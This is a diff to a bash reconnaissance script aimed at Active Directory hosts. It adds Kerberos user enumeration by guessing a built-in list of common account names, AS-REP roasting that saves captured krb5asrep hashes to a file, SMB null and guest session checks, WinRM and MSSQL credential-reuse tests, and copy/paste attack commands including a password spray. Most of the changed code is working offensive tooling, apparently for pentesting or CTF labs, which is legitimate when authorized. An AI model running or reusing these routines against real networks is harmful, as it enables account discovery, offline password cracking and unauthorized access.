@@ -55,6 +55,10 @@ LDAP_DOMAIN=""
 SMB_FOUND=false
 SMB_ENUM_DONE=false
 NO_COLOR=false
+KERB_DETECTED=false
+KERB_ENUM_DONE=false
+KERB_REALM=""
+USERS_FILE=""
 
 # --- Passing in User Info -----
 AUTH_USER=""
@@ -241,7 +245,7 @@ cme_enum_users() {
 
     # --- 1. Hard failure: no auth at all ---
     if echo "$RAW_CME" | grep -qiE '\[-\].*(STATUS_LOGON_FAILURE|NT_STATUS_LOGON_FAILURE|ACCESS_DENIED)'; then
-        notify "SMB authentication failed ($AUTH_LABEL)"
+        warn "SMB authentication failed ($AUTH_LABEL)"
         return 1
     fi
 
@@ -379,7 +383,7 @@ ldap_enum() {
 
             # 3d. Fallback to LDAPS only if LDAP fails AND auth is used
             if [[ -z "$LDAP_BASE_DN" && "$USE_AUTH" == "auth" ]] && grep -qx 636 "$OPEN_PORTS_FILE"; then
-                notify "LDAP RootDSE failed — retrying over LDAPS"
+                warn "LDAP RootDSE failed — retrying over LDAPS"
                 LDAP_BASE_DN=$(
                     ldapsearch -x -H ldaps://$TARGET -s base -b "" defaultNamingContext 2>/dev/null \
                     | sed -n 's/^defaultNamingContext:[[:space:]]*//p'
@@ -503,33 +507,233 @@ ldap_enum() {
 }
 
 kerberos_auth_check() {
-    #echo "[DEBUG] Inside Kerberos_Auth_Check()"
-    if ! command -v kinit >/dev/null 2>&1; then
-        notify "kinit not found/installed — skipping Kerberos auth check"
-        return 0
-    fi
-    echo "[DEBUG]     running..."
-    local REALM="${LDAP_DOMAIN:-}"
-    REALM="${REALM^^}"
+    command -v kinit >/dev/null 2>&1 || {
+        notify "kinit not found — skipping Kerberos auth check"
+        return
+    }
 
-    if [ -z "$REALM" ]; then
-        notify "Kerberos detected but domain not yet known — skipping Kerberos auth check"
+    if [[ -z "$KERB_REALM" ]]; then
+        notify "Kerberos realm not known — skipping auth check"
         return
     fi
 
     echo
     info "Validating Kerberos credentials (safe check)"
+    echo "[DEBUG] kinit $AUTH_USER@$KERB_REALM"
 
-    if echo "$AUTH_PASS" | kinit "$AUTH_USER@$REALM" >/dev/null 2>&1; then
+    if echo "$AUTH_PASS" | kinit "$AUTH_USER@$KERB_REALM" >/dev/null 2>&1; then
         success "Kerberos authentication successful"
         kdestroy
-        KERB_AUTH_OK=true
     else
-        notify "Kerberos authentication failed (this is not fatal)"
+        warn "Kerberos authentication failed (non-fatal)"
     fi
-
 }
 
+resolve_kerberos_realm() {
+    # Priority:
+    # 1. LDAP-derived domain
+    # 2. --domain argument
+    # 3. DNS reverse / hostname (optional future)
+
+    if [[ -n "$LDAP_DOMAIN" ]]; then
+        KERB_REALM="${LDAP_DOMAIN^^}"
+    elif [[ -n "$AUTH_DOMAIN" ]]; then
+        KERB_REALM="${AUTH_DOMAIN^^}"
+    else
+        return 1
+    fi
+
+    success "Kerberos realm identified: $KERB_REALM"
+    return 0
+}
+
+kerberos_enum_users() {
+    command -v impacket-GetNPUsers >/dev/null 2>&1 || \
+    command -v GetNPUsers.py >/dev/null 2>&1 || {
+        warn "Kerberos enum requested, but GetNPUsers not installed"
+        return
+    }
+
+    local KERB_CMD
+    KERB_CMD=$(getnpusers_cmd) || return
+
+    if [[ -z "$KERB_REALM" ]]; then
+        notify "Kerberos detected, but realm not resolved — skipping enum"
+        return
+    fi
+
+    echo
+    info "Kerberos detected — starting user enumeration"
+
+    COMMON_USERS=(
+        administrator admin guest krbtgt test backup
+        svc svc_backup svc_sql svc_mssql svc_web svc_app svc_ldap
+        sqlsvc mssql exchange iis websvc appsvc backupsvc veeam
+        student lab training
+    )
+    
+    USERFILE_OK=true
+    
+    # Validate USERS_FILE
+    if [[ -z "${USERS_FILE:-}" ]]; then
+        notify "USERS_FILE variable not set — skipping AS-REP roasting"
+        USERFILE_OK=false
+    fi
+    if [[ ! -f "$USERS_FILE" ]]; then
+        notify "USERS_FILE does not exist ($USERS_FILE) — skipping AS-REP roasting"
+        USERFILE_OK=false
+    fi
+    if [[ ! -s "$USERS_FILE" ]]; then
+        notify "USERS_FILE exists but is empty — skipping AS-REP roasting"
+        USERFILE_OK=false
+    fi
+
+    FOUND=false
+    AUTH_OK=false
+    ASREP_OK=false
+
+    ########################################
+    # 1. Unauthenticated enumeration
+    ########################################
+    info "Attempting unauthenticated Kerberos user enumeration"
+    echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+    echo -e "        ${GREEN}$KERB_CMD $KERB_REALM/[user] -dc-ip $TARGET -no-pass${RESET}"
+
+    for user in "${COMMON_USERS[@]}"; do
+        timeout 3 "$KERB_CMD" "$KERB_REALM/$user" -dc-ip "$TARGET" -no-pass 2>&1 \
+            | grep -qi 'preauth' && {
+                success "Valid Kerberos user (unauth): ${BYELLOW}$user${RESET}"
+                FOUND=true
+            }
+    done
+
+    ########################################
+    # 2. Authenticated enumeration (FIXED)
+    ########################################
+    if $CREDS_PROVIDED; then
+        echo
+        info "Attempting authenticated Kerberos enumeration"
+
+        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+        echo -e "        ${GREEN}$KERB_CMD '$KERB_REALM/$AUTH_USER:$AUTH_PASS' -dc-ip $TARGET${RESET}"
+
+        OUT=$(timeout 6 "$KERB_CMD" \
+            "$KERB_REALM/$AUTH_USER:$AUTH_PASS" \
+            -dc-ip "$TARGET" 2>&1)
+
+        # --- AUTH SUCCESS CONDITIONS ---
+        if echo "$OUT" | grep -qiE '\$krb5asrep\$|No entries found!'; then
+            success "Kerberos authentication successful (authenticated enumeration)"
+            AUTH_OK=true
+            FOUND=true
+        fi
+
+        # --- REAL AUTH FAILURE ---
+        if echo "$OUT" | grep -qiE 'KDC_ERR_PREAUTH_FAILED|C_PRINCIPAL_UNKNOWN|Cannot find KDC'; then
+            warn "Kerberos authentication failed"
+            return
+        fi
+    fi
+    
+    ########################################
+    # 4. Attempt to perform ASREP Roast
+    ########################################
+    if $USERFILE_OK; then
+        ########################################
+        #   AS-REP roast attempt - Unauthenticate
+        ########################################
+        info "Attempting AS-REP roast using discovered users - Unauthenticated"
+        note "User file: $USERS_FILE"
+
+        echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+        echo -e "        ${GREEN}$KERB_CMD '$KERB_REALM/' -dc-ip $TARGET -usersfile $USERS_FILE${RESET}"
+
+        OUT=$(timeout 15 "$KERB_CMD" \
+            "$KERB_REALM/" \
+            -dc-ip "$TARGET" \
+            -usersfile "$USERS_FILE" 2>&1)
+
+        ########################################
+        # Interpret output correctly
+        ########################################
+        # --- protocol success ---
+        if echo "$OUT" | grep -qiE '\$krb5asrep\$|No entries found!'; then
+            success "Kerberos AS-REP request completed successfully"
+            AUTH_OK=true
+            FOUND=true
+            fi
+
+            # --- AS-REP hashes found ---
+            if echo "$OUT" | grep -q '\$krb5asrep\$'; then
+            critical "AS-REP roastable users identified!"
+            echo "$OUT" | grep '\$krb5asrep\$' > "asrep_hashes_$TARGET.txt"
+            success "Saved AS-REP hashes to asrep_hashes_$TARGET.txt"
+            ASREP_OK=true
+        fi
+
+        # --- Real failure conditions ---
+        if echo "$OUT" | grep -qiE 'KDC_ERR_PREAUTH_FAILED|C_PRINCIPAL_UNKNOWN|Cannot find KDC'; then
+            warn "Kerberos AS-REP request failed"
+            ASREP_OK=false
+        fi
+        
+        
+        if $CREDS_PROVIDED; then     
+            ########################################
+            #   AS-REP roast attempt
+            ########################################
+            info "Attempting AS-REP roast using discovered users - Authenticated"
+            note "User file: $USERS_FILE"
+
+            echo -e "     ${YELLOW}$ICON_TIP Copy/Paste:${RESET}"
+            echo -e "        ${GREEN}$KERB_CMD '$KERB_REALM/$AUTH_USER:$AUTH_PASS' -dc-ip $TARGET -usersfile $USERS_FILE${RESET}"
+
+            OUT=$(timeout 15 "$KERB_CMD" \
+                "'$KERB_REALM/$AUTH_USER:$AUTH_PASS'" \
+                -dc-ip "$TARGET" \
+                -usersfile "$USERS_FILE" 2>&1)
+
+            ########################################
+            # Interpret output correctly
+            ########################################
+
+            # --- Authentication / protocol success ---
+            if echo "$OUT" | grep -qiE '\$krb5asrep\$|No entries found!'; then
+                success "Kerberos AS-REP request completed successfully"
+                AUTH_OK=true
+                FOUND=true
+            fi
+
+            # --- AS-REP hashes found ---
+            if echo "$OUT" | grep -q '\$krb5asrep\$'; then
+                critical "AS-REP roastable users identified!"
+                echo "$OUT" | grep '\$krb5asrep\$' > "asrep_hashes_$TARGET.txt"
+                success "Saved AS-REP hashes to asrep_hashes_$TARGET.txt"
+                ASREP_OK=true
+            fi
+
+            # --- Real failure conditions ---
+            if echo "$OUT" | grep -qiE 'KDC_ERR_PREAUTH_FAILED|C_PRINCIPAL_UNKNOWN|Cannot find KDC'; then
+                warn "Kerberos AS-REP request failed"
+                ASREP_OK=false
+            fi
+        fi
+    fi
+
+    ########################################
+    # 4. Final status
+    ########################################
+    if $USERFILE_OK; then
+        if ! $ASREP_OK; then
+             warn "No AS-REP roastable users found"
+        fi
+    fi
+    if ! $FOUND; then
+        warn "Kerberos enumeration completed — no users identified"
+    fi
+
+    KERB_ENUM_DONE=true
+}
 
 # --------- Ports ----------
 PORTS=(
@@ -662,7 +866,7 @@ for ENTRY in "${PORTS[@]}"; do # ---- MAX_JOBS throttle ----
         443|8443) echo https >> "$HTTPS_MARKER" ;;
         21) echo "FTP" >> "$HINT_FILE" ;;
         139|445) echo "SMB" >> "$HINT_FILE"; echo "$PORT" >> "$SMB_MARKER" ;;
-        88) echo "KERBEROS" >> "$HINT_FILE"; KERBEROS_FOUND=true; echo "$PORT" >> "$KERB_MARKER" ;;
+        88) echo "KERBEROS" >> "$HINT_FILE" ; echo "$PORT" >> "$KERB_MARKER" ;;
         389|636) echo "LDAP" >> "$HINT_FILE" ; echo "$PORT" >> "$LDAP_MARKER" ;;
         6379) echo "REDIS" >> "$HINT_FILE" ;;
         2375) echo "DOCKER" >> "$HINT_FILE" ;;
@@ -686,33 +890,6 @@ for ENTRY in "${PORTS[@]}"; do # ---- MAX_JOBS throttle ----
                 echo -e "${YELLOW}[i] HTTP redirect → $redirect${RESET}"
             fi
         fi
-    fi
-    
-    #  Kerberos Check
-    if [ "$PORT" = "88" ]; then
-        #echo -e "  ${YELLOW}[i] Kerberos service detected${RESET}"
-
-	if $ENABLE_KERB_ENUM; then
-	    KERB_CMD=$(getnpusers_cmd 2>/dev/null || true)
-
-	    if [ -n "$KERB_CMD" ]; then
-		echo -e "  [i] Running safe Kerberos user enumeration..."
-
-		COMMON_USERS=( administrator admin guest krbtgt test backup
-			svc svc_backup svc_sql svc_mssql svc_web svc_app svc_ldap
-			sqlsvc mssql exchange iis websvc appsvc backupsvc veeam
-			student lab training )
-
-		for user in "${COMMON_USERS[@]}"; do
-		    timeout 3 $KERB_CMD "$TARGET/$user" -no-pass 2>&1 \
-		        | grep -qi 'preauth' && \
-		        notify "    Valid Kerberos user: ${GREEN}$user${RESET}"
-		done
-	    else
-		echo -e "  ${YELLOW}[i] Kerberos enum requested, but impacket GetNPUsers not found${RESET}"
-		echo -e "      ${YELLOW}Install: sudo apt install impacket-scripts${RESET}"
-	    fi
-	fi
     fi
     
     # -------- LDAP / LDAPS Domain Detection --------
@@ -878,14 +1055,13 @@ if [ -s "$SMB_MARKER" ]; then
             return
         fi
 
-        echo "$ROOT_LIST" \
+        echo -e "$ROOT_LIST" \
             | awk '
                 /blocks of size/ {next}
                 /NT_STATUS/ {next}
-                NF {print}
-            ' \
-            | highlight_keywords \
-            | sed 's/^/          - /'
+                NF {print "          - "$0}
+            ' #\
+            #| highlight_keywords
 
         # Loot detection
         if echo "$ROOT_LIST" | grep -Eqi '(password|passwd|pwd|backup|\.kdbx|\.xlsx)'; then
@@ -904,7 +1080,6 @@ if [ -s "$SMB_MARKER" ]; then
                     /NT_STATUS/ {next}
                     NF {print}
                 ' \
-                | highlight_keywords \
                 | sed 's/^/            - /'
         done
     }
@@ -992,10 +1167,22 @@ if [ -s "$SMB_MARKER" ]; then
 
     # -------- Auth Attempts (ORDER MATTERS) --------
     # 1) True NULL session
-    smb_enum_smbclient "%" "NULL session" || true
+    if smb_auth_check "%"; then
+        success "SMB NUll Session successful"
+    	smb_enum_smbclient "%" "NULL session" || \
+            notify "NULL Session Allowed, but no shares are visible to this user"
+    else
+        warn "SMB NULL Session failed"
+    fi 
 
     # 2) Guest with empty password (matches CME behavior)
-    smb_enum_smbclient "guest%" "GUEST" || true
+    if smb_auth_check "guest%"; then
+        success "SMB GUEST (No Password) Successful"
+    	smb_enum_smbclient "guest%" "GUEST" || \
+            notify "Guest Access Allowed, but no shares are visible to this user"
+    else
+        warn "SMB Guest (No Password) Session Failed"
+    fi 
     
     # 3) Check for authenticated access.
     if $CREDS_PROVIDED; then
@@ -1008,7 +1195,7 @@ if [ -s "$SMB_MARKER" ]; then
             smb_enum_smbclient "$AUTH_USER%$AUTH_PASS" "AUTHENTICATED" || \
                 notify "Authenticated but no shares are visible to this user"
         else
-            notify "SMB authentication failed for provided credentials"
+            warn "SMB authentication failed for provided credentials"
         fi
     fi
 
@@ -1067,7 +1254,7 @@ if [ -s "$SMB_MARKER" ]; then
             note "User list saved to: ${GREEN}$USERS_FILE${RESET}"
             lightbulb " Maybe try a Password Spary if you know a 'default' Password"
             lightbulb "   ${YELLOW}Copy/Paste:${RESET}"
-             echo -e "        crackmapexec smb ${TARGET} -u $USERS_FILE -p 'ADefaultPassword'"
+            echo -e "        crackmapexec smb ${TARGET} -u $USERS_FILE -p 'ADefaultPassword'"
 
             # Feed recon hints
             echo "KERBEROS" >> "$HINT_FILE"
@@ -1092,6 +1279,24 @@ if [ -s "$LDAP_MARKER" ] && ! $LDAP_ENUM_DONE; then
     $CREDS_PROVIDED && ldap_enum auth "${AUTH_DOMAIN:-$LDAP_DOMAIN}"
 fi
 
+# --------- Kerberos Post-Scan Handling ----------
+if [ -s "$KERB_MARKER" ]; then
+    KERB_DETECTED=true
+
+    if resolve_kerberos_realm; then
+        if $ENABLE_KERB_ENUM; then
+            kerberos_enum_users
+        else
+            alert "Kerberos detected — re-run with --kerb-enum to enumerate users"
+        fi
+
+        if $CREDS_PROVIDED; then
+            kerberos_auth_check
+        fi
+    else
+        notify "Kerberos detected, but domain/realm could not be resolved"
+    fi
+fi
 
 if $CREDS_PROVIDED; then
     #echo "[DEBUG] Creds were provided"
@@ -1108,13 +1313,17 @@ if $CREDS_PROVIDED; then
        && command -v crackmapexec >/dev/null; then
 
        #echo "[DEBUG] Creds were provided for CME targeting WINRM"
-
+       
+       info "Trying WinRM:"
+       lightbulb "    ${YELLOW}Copy/Paste:${RESET}"
+             echo -e "        ${GREEN}crackmapexec winrm $TARGET -u '$AUTH_USER' -p '$AUTH_PASS'${RESET}"
+       
        if crackmapexec winrm "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS" 2>/dev/null \
-           | grep -qi success; then
-           critical "WinRM credential reuse confirmed"
-       else
-           warn "WinRM authentication failed or not permitted"
-       fi
+                | grep -qP 'WINRM\s+\S+\s+\d+\s+\S+\s+\[\+\]'; then
+            critical "WinRM credential reuse confirmed"
+        else
+            warn "WinRM authentication failed or not permitted"
+        fi
     fi
 
     # MSSQL
@@ -1122,12 +1331,16 @@ if $CREDS_PROVIDED; then
        && command -v crackmapexec >/dev/null; then
 
        #echo "[DEBUG] Creds were provided for CME targeting MSSQL"
-
+       
+       lightbulb "Trying MSSQL:"
+       lightbulb "   ${YELLOW}Copy/Paste:${RESET}"
+             echo -e "        ${GREEN}crackmapexec mssql $TARGET -u '$AUTH_USER' -p '$AUTH_PASS'${RESET}"
+       
        if crackmapexec mssql "$TARGET" -u "$AUTH_USER" -p "$AUTH_PASS" 2>/dev/null \
             | grep -qi success; then
             critical "MSSQL credential reuse confirmed"
         else
-            notify "MSSQL authentication failed or not permitted"
+            warn "MSSQL authentication failed or not permitted"
         fi
     fi
 fi
